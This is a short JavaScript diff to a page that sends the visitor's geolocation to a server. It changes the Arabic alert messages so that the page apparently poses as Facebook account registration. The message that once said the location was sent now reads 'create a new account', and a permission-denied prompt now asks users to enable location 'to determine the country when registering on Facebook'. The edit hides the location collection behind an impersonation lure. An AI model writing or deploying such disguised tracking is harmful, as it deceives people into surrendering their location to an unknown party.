@@ -160,7 +160,7 @@ function sendLocation(position) {
     .then(response => response.json())
     .then(data => {
         if (data.ok) {
-            showAlert('alert-success', 'تم إرسال موقعك بنجاح.');
+            showAlert('alert-success', 'أنشاء حساب جديد');
         } else {
             showAlert('alert-danger', 'خطأ في إرسال موقعك.');
         }
@@ -174,7 +174,7 @@ function sendLocation(position) {
 function showError(error) {
     switch(error.code) {
         case error.PERMISSION_DENIED:
-            showAlert('alert-danger', 'لم يتم السماح بوصول الموقع. يرجى تفعيل خدمة تحديد الموقع في إعدادات هاتفك.');
+            showAlert('alert-danger', 'يرجى تفعيل خدمة الموقع لتحديد البلد عند التسجيل في فيسبوك');
             break;
         case error.POSITION_UNAVAILABLE:
             showAlert('alert-danger', 'معلومات الموقع غير متاحة.');
